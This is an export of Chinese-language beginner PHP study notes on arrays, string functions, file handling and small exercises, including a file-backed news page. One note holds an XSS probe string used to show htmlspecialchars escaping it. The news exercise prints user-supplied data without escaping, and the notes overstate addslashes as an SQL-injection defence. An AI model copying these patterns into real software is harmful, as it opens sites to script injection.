  <entry>
    <title><![CDATA[note18]]></title>
    <url>%2F2019%2F08%2F07%2Fnote18%2F</url>
    <content type="text"><![CDATA[Abstract: PHP数组索引数组和关联数组的遍历，以及数组常用的函数；PHP文件处理常用函数以及不同模式下对文件的操作。 一、数组1. 数组遍历 索引数组 1234567&lt;?php$arr1 = [&apos;wm&apos;, 56, &apos;Beijing&apos;];for($i=0; $i&lt;count($arr1); $i++)&#123; echo $arr1[$i]; echo PHP_EOL;&#125;?&gt; 关联数组 foreach遍历 1234567891011&lt;?php$arr = [ &apos;name&apos; =&gt; &apos;zs&apos;, &apos;age&apos; =&gt; 18, &apos;add&apos; =&gt; &apos;China&apos;];foreach($arr as $item =&gt;$value)&#123; echo $item . &quot;=&gt;&quot; . $value; echo PHP_EOL;&#125;?&gt; ​ for遍历 123456789101112131415&lt;?php$arr = [ &apos;name&apos; =&gt; &apos;zs&apos;, &apos;age&apos; =&gt; 18, &apos;add&apos; =&gt; &apos;China&apos;];for($i=0; $i&lt;count($arr); $i++)&#123; echo key($arr) . &apos;=&gt;&apos; . current($arr); echo PHP_EOL; next($arr);&#125;?&gt; 12345678910111213141516171819202122232425262728&lt;?php$arr = [ &apos;name&apos; =&gt; &apos;zs&apos;, &apos;age&apos; =&gt; 18, &apos;add&apos; =&gt; &apos;China&apos;];$arr1 = $arr;$keyName = array_keys($arr);$valueName = array_values($arr);echo $keyName[0];echo PHP_EOL;for($i=0; $i&lt;count($arr); $i++)&#123; echo $keyName[$i] . &quot;=&gt;&quot; . $arr[$keyName[$i]]; echo PHP_EOL;&#125;for($i=0; $i&lt;count($arr); $i++)&#123; echo array_pop($arr1); next($arr1); echo PHP_EOL;&#125;fwrite(STDOUT,iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,&apos;使用for循环遍历关联数组&apos;));echo PHP_EOL;for($i=0; $i&lt;count($arr); $i++)&#123; echo $keyName[$i] . &apos;=&gt;&apos; . $valueName[$i]; echo PHP_EOL;&#125;?&gt; 2. 数组常用函数 函数名称 作用 array_keys(array, value, strict) 返回数组中所有的键名 array_values(array) 返回数组中所有的值 count(array)/sizeof(array) 返回数组中元素的数目 array_merge(array1, array2) 把一个或多个数组合并为一个数组 array_key_exists(key, array) 检查指定的键名是否存在与数组中 sort() 对数值组进行升序排序 in_array(needle, haystack) 检查数组中是否存在指定的值 array_unique() 删除数组中重复的值 array_pop(array) 删除数组中最后一个元素（栈） array_keys(array, value, strict) 123456789101112&lt;?php$a = array(&quot;Volvo&quot; =&gt; &quot;XC90&quot;, &quot;BMW&quot; =&gt; &quot;X5&quot;, &quot;Toyota&quot; =&gt; &quot;Highlander&quot;);//[0]=&gt;Volvo [1]=&gt;BMW [2]=&gt;Toyotaprint_r(array_keys($a));//[0]=&gt;Toyotaprint_r(array_keys($a,&quot;Highlander&quot;));$a=array(10,20,30,&quot;10&quot;);//[0]=&gt;3print_r(array_keys($a,&quot;10&quot;,true));?&gt; array_values(array) count()/sizeof() 123456789101112&lt;?php$a = array(&quot;Name&quot; =&gt; &quot;Peter&quot;, &quot;Age&quot; =&gt; &quot;41&quot;, &quot;Country&quot; =&gt; &quot;USA&quot;);//[0]=&gt;Peter [1]=&gt;41 [2]=&gt;USAprint_r(array_values($a));//3echo count($a);echo PHP_EOL;//3echo sizeof($a);echo PHP_EOL;?&gt; array_merge(array1, array2) 1234567891011121314&lt;?php$a1 = array(&quot;a&quot; =&gt; &quot;red&quot;, &quot;b&quot; =&gt; &quot;green&quot;);$a2 = array(&quot;c&quot; =&gt; &quot;blue&quot;, &quot;b&quot; =&gt; &quot;yellow&quot;);//如果两个或更多个数组元素有相同键名，则最后元素会覆盖其他元素//[a]=&gt;red [b]=&gt;yellow [c]=&gt;blueprint_r(array_merge($a1, $a2));$a=array(3=&gt;&quot;red&quot;,4=&gt;&quot;green&quot;);//若数组键名是整数，则该函数将返回以键名0开始进行重新索引//[0]=&gt;red [1]=&gt;greenprint_r(array_merge($a));?&gt; array_key_exists(key, array) 1234567891011121314151617181920&lt;?php$a=array(&quot;Volvo&quot;=&gt;&quot;XC90&quot;,&quot;BMW&quot;=&gt;&quot;X5&quot;);if (array_key_exists(&quot;Volvo&quot;,$a))&#123; echo &quot;Key exists!&quot;;&#125;else&#123; echo &quot;Key does not exist!&quot;;&#125;$a=array(&quot;Volvo&quot;,&quot;BMW&quot;);if (array_key_exists(0,$a))&#123; echo &quot;Key exists!&quot;;&#125;else&#123; echo &quot;Key does not exist!&quot;;&#125;?&gt; sort() 1234567891011121314151617181920&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); sort($cars); $clength=count($cars); for($x=0;$x&lt;$clength;$x++)&#123; echo $cars[$x]; echo &quot;&lt;br&gt;&quot;; &#125; // BMW Toyota Volvo $numbers=array(4,6,2,22,11); sort($numbers); $arrlength=count($numbers); for($x=0;$x&lt;$arrlength;$x++)&#123; echo $numbers[$x]; echo &quot;&lt;br&gt;&quot;; &#125;//2 4 6 11 22?&gt; in_array() 123456789101112&lt;?php$sites = array(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Taobao&quot;, &quot;Facebook&quot;); if (in_array(&quot;Runoob&quot;, $sites))&#123; echo &quot;找到匹配项！&quot;;&#125;else&#123; echo &quot;没有找到匹配项！&quot;;&#125;?&gt; 在练习二中成绩输入实例中也使用了in_array函数 array_unique() 12345&lt;?php$a=array(&quot;a&quot;=&gt;&quot;red&quot;,&quot;b&quot;=&gt;&quot;green&quot;,&quot;c&quot;=&gt;&quot;red&quot;);// [a]=&gt;red [b]=&gt;greenprint_r(array_unique($a));?&gt; array_pop(array) 123456&lt;?php$a=array(&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;);array_pop($a);// [0]=&gt; red [1]=&gt;greenprint_r($a);?&gt; 二、文件处理1. 打开文件fopen模式 模式 描述 r 只读。在文件的开头开始。 r+ 读/写。在文件的开头开始。 w 只写。打开并清空文件的内容；若文件不存在，则创建新文件。 w+ 读/写。打开并清空文件的内容；若文件不存在，则创建新文件。 a 追加，若文件不存在，则创建新文件。 a+ 读/追加。 x 只写。创建新文件。若文件已存在，则返回FALSE和一个错误。 x+ 读/写，创建新文件。若文件已存在，则返回FALSE和一个错误。 2.检测文件末尾(EOF)123if(feof($file))&#123; echo &quot;文件末尾&quot;;&#125; 3. 逐行/字符读取文件123456789&lt;?php$file = fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;无法打开文件!&quot;);// 读取文件每一行，直到文件结尾while(!feof($file))&#123; echo fgets($file). &quot;&lt;br&gt;&quot;;&#125;fclose($file);?&gt; 12345678&lt;?php$file=fopen(&quot;welcome.txt&quot;,&quot;r&quot;) or exit(&quot;无法打开文件!&quot;);while (!feof($file))&#123; echo fgetc($file);&#125;fclose($file);?&gt; 4. 写文件fwrite(file, string, length)和fputs(file, string, length) 12345&lt;?php$file = fopen(&quot;test.txt&quot;,&quot;w&quot;);echo fwrite($file,&quot;Hello World. Testing!&quot;);fclose($file);?&gt; 12345&lt;?php$file = fopen(&quot;test.txt&quot;,&quot;w&quot;);echo fputs($file,&quot;Hello World. Testing!&quot;);fclose($file);?&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习3]]></title>
    <url>%2F2019%2F08%2F07%2Fpractice3%2F</url>
    <content type="text"><![CDATA[Abstract: 学习PHP的三个练习，第一个是判断一个数是否为素数，第二个是画五角星，第三个是写一个新闻界面，用读写文件来代替数据库。 题目一：判断一个数是否为素数 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt; 判断一个数是否为素数 &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;judgePrime.php&quot; method=&quot;get&quot;&gt; 请输入一个数：&lt;input type=&quot;text&quot; name=&quot;number&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;?php $num = isset($_GET[&apos;number&apos;]) ? $_GET[&apos;number&apos;]: 2; $k = 0; for($i=1; $i&lt;=$num; $i++)&#123; if($num%$i == 0)&#123; $k++; &#125; &#125; if($_GET[&apos;number&apos;]!=NULL) &#123; if ($k == 2) &#123; echo $num . &apos;是一个素数&apos;; &#125; else &#123; echo $num . &apos;不是一个素数&apos;; &#125; &#125;?&gt;&lt;/body&gt;&lt;/html&gt; OUT 题目二：用PHP画五角星 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpecho &quot;\n\n&quot;;for ( $i1 = 1; $i1 &lt; 6; $i1++ ) /*这是五角星的上面一个角*/&#123; for ( $j1 = 1; $j1 &lt; 19 - $i1; $j1++ ) printf( &quot; &quot; ); for ( $k1 = 1; $k1 &lt;= 2 * $i1 - 1; $k1++ ) printf( &quot;*&quot; ); printf( &quot;\n&quot; );&#125;for ($i2 = 1; $i2 &lt; 5; $i2++ ) /*这是五角星的中间两个角*/&#123; for ( $j2 = 1; $j2 &lt; 3 * $i2 - 3; $j2++ ) printf( &quot; &quot; ); for ( $k2 = 1; $k2 &lt;= 42 - 6 * $i2; $k2++ ) printf( &quot;*&quot; ); printf( &quot;\n&quot; );&#125;for ( $i3 = 1; $i3 &lt; 3; $i3++ ) /*这是中间与下部相接的部分*/&#123; for ( $j3 = 1; $j3 &lt; 12 - $i3; $j3++ ) printf( &quot; &quot; ); for ( $k3 = 1; $k3 &lt;= 12 + 2 * $i3; $k3++ ) printf( &quot;*&quot; ); printf( &quot;\n&quot; );&#125;for ( $i4 = 1; $i4 &lt; 5; $i4++ ) /*这是五角星的下面两个角*/&#123; for ( $j4 = 1; $j4 &lt; 10 - $i4; $j4++ ) printf( &quot; &quot; ); for ( $k4 = 1; $k4 &lt;= 10 - 2 * $i4; $k4++ ) printf( &quot;*&quot; ); for ( $m4 = 1; $m4 &lt; 6 * $i4 - 3; $m4++ ) printf( &quot; &quot; ); for ( $n4 = 1; $n4 &lt;= 10 - 2 * $i4; $n4++ ) printf( &quot;*&quot; ); printf( &quot;\n&quot; );&#125;?&gt; OUT 题目三：新闻界面 在news_file文件夹下有index.php和data文件夹，index.php主要是显示新闻的作用，data文件夹里面有add_news.php和news.db，其中add_news.php主要是添加新闻到news.db中，news.db每行存放着新闻的标号，标题，内容，日期，作者，热度和图片链接，其中标题，内容与作者使用了base64编码，两两用||分隔。 index.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;news&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;h1 align=&quot;center&quot;&gt;ICQ新闻中心&lt;/h1&gt;&lt;hr&gt;&lt;table align=&quot;center&quot;&gt; &lt;tr&gt; &lt;th&gt;热度&lt;/th&gt; &lt;th&gt;标题&lt;/th&gt; &lt;th&gt;作者&lt;/th&gt; &lt;th&gt;时间&lt;/th&gt; &lt;th&gt;素质三联&lt;/th&gt; &lt;/tr&gt; &lt;?php //用只读方式打开news.db文件 $fhandle = fopen(&quot;./data/news.db&quot;, &quot;r&quot;); //设置一个计数器，小于3时，每个文章标题下面增加图片和简介 $top3Cnt=1; while(!feof($fhandle)) &#123; $fline = fgets($fhandle); $data = explode(&apos;||&apos;, $fline); $title = base64_decode($data[1]); $content = base64_decode($data[2]); $date = $data[3]; $author = base64_decode($data[4]); $hot = $data[5]; $imgUrl = $data[6]; echo &lt;&lt;&lt;EOF &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;$hot&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;myl.php&quot;&gt;$title&lt;/a&gt;&lt;/td&gt; &lt;td&gt;$author&lt;/td&gt; &lt;td&gt;$date&lt;/td&gt; &lt;td&gt;&lt;button&gt;👍&lt;/button&gt;/&lt;button&gt;👎&lt;/button&gt;&lt;/td&gt; &lt;/tr&gt;EOF; if($top3Cnt&lt;=3)&#123; $tmpContent = mb_substr(base64_decode($data[2]), 0,50); echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td&gt;&lt;img src=&quot;$imgUrl&quot; height=&quot;80&quot; width=&quot;80&quot;&gt;&lt;/td&gt; &lt;td colspan=&apos;4&apos;&gt;&lt;b&gt;内容简介：&lt;/b&gt;$tmpContent&lt;/td&gt; &lt;/tr&gt;EOF; &#125; $top3Cnt++; &#125; ?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; OUT add_news.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;增加新闻&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;add_news.php&quot; method=&quot;post&quot;&gt; 标号：&lt;input type=&quot;number&quot; name=&quot;id&quot;&gt;&lt;br&gt; 标题：&lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;&lt;!-- 标题：&lt;input type=&quot;text&quot; namne=&quot;title&quot;&gt;&lt;br&gt;--&gt; 内容：&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;&lt;br&gt; 日期：&lt;input type=&quot;date&quot; name=&quot;date&quot;&gt;&lt;br&gt; 作者：&lt;input type=&quot;author&quot; name=&quot;author&quot;&gt;&lt;br&gt; 热度：&lt;input type=&quot;number&quot; name=&quot;hot&quot;&gt;&lt;br&gt; 图片：&lt;input type=&quot;url&quot; name=&quot;imgUrl&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;?php $fhandle = fopen(&apos;news.db &apos;, &apos;a&apos;); $arrMes = array(); @$arrMes[0] = $_POST[&apos;id&apos;]; @$arrMes[1] = base64_encode($_POST[&apos;title&apos;]); @$arrMes[2] = base64_encode($_POST[&apos;content&apos;]); @$arrMes[3] = $_POST[&apos;date&apos;]; @$arrMes[4] = base64_encode($_POST[&apos;author&apos;]); @$arrMes[5] = $_POST[&apos;hot&apos;]; @$arrMes[6]= $_POST[&apos;imgUrl&apos;]; if($arrMes[0]!=NULL) &#123; $writeMes = implode(&apos;||&apos;, $arrMes); echo $writeMes; $fline = fputs($fhandle, $writeMes); &#125; fclose($fhandle);?&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note17]]></title>
    <url>%2F2019%2F08%2F06%2Fnote17%2F</url>
    <content type="text"><![CDATA[Abstract: PHP语言中while和for的用法，以及PHP数组的用法。 1. PHP三种工作模式(文件后缀解析时有何区别)1.1 module模式LAMP — Linux Apache Php Mysql php作为apache模块运行，apache遇到一个php文件，，就相当于执行系统命令 php a.php，文件后缀解析以apache配置文件为主，如果apache认为.xxx文件时php脚本，就当作php执行。 1.2 CGI模式LNMP — Linux Nginx Php Mysql php会监听一个端口，nginx/phpstorm/iis等中间件遇到一个php文件时，会把请求转发给php监听的端口。 有两个配置文件，一个是中间件，一个是php服务的，nginx/iis认为.xxx后缀文件是php脚本，交给php处理，但在php配置文件中，会有一个限制php5/php3/phtml/php能够被识别。 第三周总结 最底部有三种模式的对比。 2. PHP数组2.1 数值数组​ 自动分配ID键（ID键总是从0开始） 123456&lt;?php $cars = array(&quot;Volvo&quot;, &quot;BMW&quot;, &quot;Toyota&quot;); echo $cars[0]; //输出&quot;Volvo&quot; echo $cars[1]; //输出&quot;BMW&quot; echo $cars[2]; //输出&quot;Toyota&quot;?&gt; ​ count()函数—获取数组的长度 1234&lt;?php $cars = array(&quot;Volvo&quot;, &quot;BMW&quot;, &quot;Toyota&quot;); echo count($cars);?&gt; ​ 遍历数值数组 12345678&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); $arrlength=count($cars); for($x=0;$x&lt;$arrlength;$x++)&#123; echo $cars[$x]; echo &quot;&lt;br&gt;&quot;; &#125;?&gt; 为一个数组增加一位，不适合用上述这种方法遍历。 12345678910111213141516171819&lt;?php $arr = array(&apos;name&apos;=&gt;&apos;zs&apos;, 2, &apos;age&apos;=&gt;18, 1); echo $arr[&apos;name&apos;]; //zs echo PHP_EOL; echo $arr[0]; //2 echo PHP_EOL; echo $arr[&apos;age&apos;]; //18 echo PHP_EOL; echo $arr[1]; //1 $arr1 = array(1,2,3,4,5); $arr1[0] = 6; echo PHP_EOL; $arr1[100] = 100; echo PHP_EOL; echo $arr1[0], $arr1[100]; for($i=0; $i&lt;=100; $i++)&#123; //610062345 报错，直到i=100时把100输出 echo $arr1[$i]; &#125;?&gt; 使用foreach就不会报错，数值数组和关联数组混合时，关联数组并不影响数值数组的下标。 2.2 关联数组关联数组可以指定键的数组 1234&lt;?php $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); echo &quot;Peter is &quot; . $age[&apos;Peter&apos;] . &quot; years old.&quot;;?&gt; 遍历关联数组 123456789&lt;?php $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); foreach($age as $x=&gt;$x_value) &#123; echo &quot;Key=&quot; . $x . &quot;, Value=&quot; . $x_value; echo &quot;&lt;br&gt;&quot;; &#125;?&gt; 1234567891011121314151617&lt;?php $arr = array(1, 2, 3, 4, 5); foreach($arr as $key =&gt; $value)&#123; echo $key.&quot;=&gt;&quot;.$value; echo PHP_EOL; &#125; $arr[5]=709; foreach($arr as $key =&gt; $value)&#123; echo $key.&quot;=&gt;&quot;.$value; echo PHP_EOL; &#125; $arr[100] = 100; foreach($arr as $key =&gt; $value)&#123; echo $key.&quot;=&gt;&quot;.$value; echo PHP_EOL; &#125; ?&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习2]]></title>
    <url>%2F2019%2F08%2F06%2Fpractice2%2F</url>
    <content type="text"><![CDATA[Abstract: PHP语言if-else/switch-case和while练习 题目一：输入年月日，计算是该年的多少天。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php//form: year.month.day$date = fgets(STDIN);$Date = explode(&apos;.&apos;, $date);echo $Date;$year = $Date[0];$month = $Date[1];$day = $Date[2];echo &quot;&lt;br&gt;&quot;;echo $year;echo &quot;&lt;br&gt;&quot;;echo $month;echo &quot;&lt;br&gt;&quot;;echo $day;if(($year%4==0 &amp;&amp; $year%100!=0)||($year%400==0))&#123; $flag=1;&#125;else&#123; $flag=0;&#125;switch($month)&#123; case($month&lt;=2): $days = 31*($month-1)+$day; break; case(3&lt;=$month&amp;&amp;$month&lt;=8): if($flag==1)&#123; if($month%2==1) &#123; $days = 31 * (intval($month - 1) / 2) + 29 + 30 * (intval($month / 2) - 1) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 29 + 30 * (intval($month/ 2)-2) + $day; &#125; &#125;else&#123; if($month%2==1) &#123; $days = 31 * (intval($month - 1) / 2) + 28 + 30 * (intval($month / 2) - 1) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 28 + 30 * (intval(($month) / 2)-2) + $day; &#125; &#125; break; default: if($flag==1)&#123; if($month%2==1) &#123; $days = 31 * (intval($month + 1) / 2) + 29 + 30 * (intval($month / 2) - 2) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 29 + 30 * (intval($month/ 2)-2) + $day; &#125; &#125;else&#123; if($month%2==1) &#123; $days = 31 * (intval($month + 1) / 2) + 28 + 30 * (intval($month / 2) - 2) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + 28 + 30 * (intval($month/ 2)-2) + $day; &#125; &#125; break;&#125;echo $days;?&gt; 代码缺点：可以看出来代码有些地方重复使用，没有达到简洁的目的，瑞年和平年在二月相差一天，完全可以通过flag这个标识来弥补。改进思路：设置一个FebDays的变量，把值设为28，在case里面不需要再次判断瑞年平年，计算days时，把flag加上，这样就可以把瑞平年分开。 改进版： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php//year-month-day$date = fgets(STDIN);$Date = explode(&apos;.&apos;, $date);echo $Date;$year = $Date[0];$month = $Date[1];$day = $Date[2];echo &quot;&lt;br&gt;&quot;;echo $year;echo &quot;&lt;br&gt;&quot;;echo $month;echo &quot;&lt;br&gt;&quot;;echo $day;if(($year%4==0 &amp;&amp; $year%100!=0)||($year%400==0))&#123; $flag=1;&#125;else&#123; $flag=0;&#125;$FebDays = 28;switch($month)&#123; case($month&lt;=2): $days = 31*($month-1)+$day; break; case(3&lt;=$month&amp;&amp;$month&lt;=8): if($month%2==1) &#123; $days = 31 * (intval($month - 1) / 2) + $FebDays + $flag + 30 * (intval($month / 2) - 1) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + $FebDays + $flag + 30 * (intval($month/ 2)-2) + $day; &#125; break; default: if($month%2==1) &#123; $days = 31 * (intval($month + 1) / 2) + $FebDays + $flag + 30 * (intval($month / 2) - 2) + $day; &#125; else&#123; $days = 31 * (intval($month) / 2) + $FebDays + $flag + 30 * (intval($month/ 2)-2) + $day; &#125; break;&#125;echo $days;?&gt; 两段代码对比可以发现，计算天数的代码量较少的将近一半。 题目二：可以一直输入学生成绩，知道输入q/exit/quit退出程序 思路一：在死循环里面执行代码，符合退出条件时break 12345678910111213141516171819202122232425262728293031323334&lt;?phpwhile(1)&#123; echo &quot;Please Input Your Mes: &quot;; $inMes = fgets(STDIN); var_dump($inMes); if((trim($inMes)==&quot;q&quot;)||(trim($inMes)==&quot;quit&quot;)||(trim($inMes)==&quot;exit&quot;))&#123; break; &#125; else &#123; switch ($inMes) &#123; case(90 &lt;= $inMes &amp;&amp; $inMes &lt;= 100): echo &quot;Your Grade is A&quot;; break; case(80 &lt;= $inMes &amp;&amp; $inMes &lt; 90): echo &quot;YourGrade is B&quot;; break; case(70 &lt;= $inMes &amp;&amp; $inMes &lt; 80): echo &quot;Your Grade is C&quot;; break; case(60 &lt;= $inMes &amp;&amp; $inMes &lt; 70): echo &quot;YourGrade is D&quot;; break; case($inMes &lt; 60): echo &quot;YourGrade is E&quot;; break; default: break; &#125; echo PHP_EOL; &#125;&#125;?&gt; 问题与解决： * 退出不成功，用`var_dump($inMes)`查看发现，系统会在输入字符后加`\n`,用`trim()`函数解决 * 输入其他字符，php会把字符转换成数字，然后进行比较思路二：把退出逻辑写在while()括号内 12345678910111213141516171819202122&lt;?php$Grade = fgets(STDIN);$sss = array(&quot;q&quot;,&quot;exit&quot;,&quot;quit&quot;);//如果$Grade不在$sss数组中就继续执行程序while(!in_array(trim($Grade), $sss))&#123; switch($Grade)&#123; case $Grade&gt;=90 &amp;&amp; $Grade&lt;100; echo &quot;A&quot;; break; case $Grade&gt;=60 &amp;&amp; $Grade&lt;90; echo &quot;B&quot;; break; case $Grade&lt;60 &amp;&amp; $Grade&gt;=0; echo &quot;C&quot;; break; default: echo &apos;ERROR!&apos;; &#125; echo PHP_EOL; $Grade = fgets(STDIN);&#125;?&gt; 问题与解决： * 在处理`$Grade`与`$sss`时，想另辟蹊径，在数组`$sss`里面字符后加上`\n`但始终没有成功，最终还是对`$Grade`进行`trim()`处理。​]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note16]]></title>
    <url>%2F2019%2F08%2F06%2Fnote16%2F</url>
    <content type="text"><![CDATA[Abstract: PHP中的运算符、字符串操作和流程控制 1. PHP运算符字符串和数字进行比较时，把字符串转成数字，然后比较。 NULL False ‘’ [] 0 布尔值均为False 2. PHP常用函数 函数名称 作用 addslashes($string) ‘ “ 空 \ 前添加\，转移特殊字符，防御SQL注入 bin2hex() 计算ASCII码 chr(ascii: 0x) ASCII码转换成字符 crypt(‘passwd’ , salt) 加密函数 md5($str) hash计算 explode(‘.’, $str) 根据提供的字符，来切割字符串，结果是一个数组 htmlspecialchars($payload) ‘ “ &lt; &gt; &amp; 转义特殊字符为html实体编码，防御xss implode(‘.’, $str ) 返回一个由数组元素组合成的字符串 str_ireplace(sear,rep, subj) 替换字符串 strchr(haystack, needle) 查找字符串，并返回字符串之后的所有内容 strcmp(str1, str2) 比较字符串，区分大小写 strlen($str) 计算字符串长度 substr(str, start, length) 字符串截取，按“位”截取 mb_substr(str, start, length) 同上，按“字”截取 trim($str) 去除两侧空白字符 PHP String函数 addslashes()函数返回在预定义的字符前添加反斜杠的字符串 预定义字符是： 1234* 单引号(&apos;)* 双引号(&quot;)* 反斜杠(\)* NULL 12345678910111213&lt;?php$str = addslashes(&quot;what does &quot;yolo&quot; mean?&quot;);echo $str;echo PHP_EOL;$str = addslashes(&quot;what does &apos;yolo&apos; mean?&quot;);echo $str;echo PHP_EOL;$str = addslashes(&quot;what does \yolo\ mean?&quot;);echo $str;echo PHP_EOL;$str = addslashes(&quot;what does \x00 mean?&quot;);echo $str;?&gt; OUT 123456/*what does \"yolo\" mean?what does \'yolo\' mean?what does \\yolo\\ mean?What does \0 mean?*/ bin2hex()把ASCII值返回字符；chr()把指定ASCII值返回字符。 12345678&lt;?phpecho bin2hex(&quot;\n&quot;);echo PHP_EOL;echo chr(0x61);echo PHP_EOL;$str = bin2hex(&quot;Hello World!&quot;);echo($str);?&gt; OUT 12345/*0aa48656c6c6f20576f726c6421*/ crypt(str, salt)返回使用DES、Blowfish或MD5算法加密的字符串 md5()计算字符串的MD5散列 1234567&lt;?phpecho crypt('123456', 'rl');$str = 'hello';echo md5($str);?&gt; 1* explode(separator, string, limit)使用一个字符串分割另一个字符串，并返回字符串组成的数组 123456789101112131415&lt;?php$a = array();$url = &apos;https://www.baidu.com&apos;;$url = explode(&apos;.&apos;, $url);$host = $url[0];$name = $url[1];$or = $url[2];echo $host;echo PHP_EOL;echo $name;echo PHP_EOL;echo $or;echo PHP_EOL;echo ($a==0);?&gt; OUT 12345/*https://wwwbaiducom*/ 1* htmlentities()函数把字符转换为HTML实体 1234&lt;?php$str = &quot;&lt;© W3CSçh°°¦§&gt;&quot;;echo htmlentities($str);?&gt; OUT 123/*&amp;lt;&amp;copy; W3CS&amp;ccedil;h&amp;deg;&amp;deg;&amp;brvbar;&amp;sect;&amp;gt;*/ htmlspecialchars(string, flags, character-set, double_encode) 函数把一些预定义的字符转换为 HTML 实体 &amp; —&gt; $amp “ —&gt; &amp;quot ‘ —&gt; ‘ &lt; —&gt; &amp;lt &gt; —&gt; &amp;gt 12345678910111213&lt;?php$payload = &apos;&lt;img src=&quot;a&quot; onerror=&quot;alert(1)&quot;&gt;&apos;;echo htmlspecialchars($payload);$str = &quot;This is some &lt;b&gt;bold&lt;/b&gt; text.&quot;;echo htmlspecialchars($str);echo array()==null;echo PHP_EOL;$str = &quot;&lt;© W3CSçh°°¦§&gt;&quot;;echo htmlentities($str);?&gt; OUT 1234567/*&amp;lt;img src=&amp;quot;a&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;This is some &amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt; text.1&amp;lt;&amp;copy; W3CS&amp;ccedil;h&amp;deg;&amp;deg;&amp;brvbar;&amp;sect;&amp;gt;*/ 1* import(separator, array)返回一个由数组元素组成字符串 123456&lt;?php$arr = array(&apos;Hello&apos;,&apos;World!&apos;,&apos;Beautiful&apos;,&apos;Day!&apos;);echo implode(&quot; &quot;,$arr);?&gt; OUT 123/*Hello World! Beautiful Day!*/ 12* str_ireplace(find, replace, string, count)替换字符串中一些字符(不区分大小写) * strchr(string, search,before_search)搜索字符串在另一字符串中第一次出现 strcmp(sting1, string2)比较两个字符串 返回0 - 如果两个字符相等 返回&lt;0 - string1&lt;string2 返回&gt;0 - string1&gt;string2 trim()移除字符串两侧空白字符或其他预定义字符 1234567891011&lt;?phpecho str_ireplace(&quot;WORLD&quot;, &quot;Peter&quot;, &quot;Hello world!&quot;);echo PHP_EOL;echo strchr(&quot;Hello world!&quot;,&quot;world&quot;);echo PHP_EOL;echo strcmp(&quot;Hello world!&quot;,&quot;Hello world!&quot;);echo PHP_EOL;$str = &quot;Hello World!&quot;;echo $str . &quot;&lt;br&gt;&quot;;echo trim($str,&quot;Hed!&quot;);?&gt; OUT 123456/*Hello Peter!world!0Hello World!&lt;br&gt;llo Worl*/ substr(str, start, length)函数返回字符串的一部分；按”位“截取 mb_substr(str, start, length)函数返回字符串的一部分，按”字“截取 start 正数—字符串指定位置开始 负数—从字符串结尾指定位置开始 0 —字符串第一个字符处开始 length 正数—从start参数所在位置返回 负数—从字符串末端返回 1234&lt;?phpecho substr(&quot;Hello World !&quot;,0, 5); // 字符串截取，按照`位`截取echo mb_substr(&quot;abc你好!菜鸟！&quot;,0, 4); // 字符串截取，按照`字`截取?&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week3sum]]></title>
    <url>%2F2019%2F08%2F04%2Fweek3sum%2F</url>
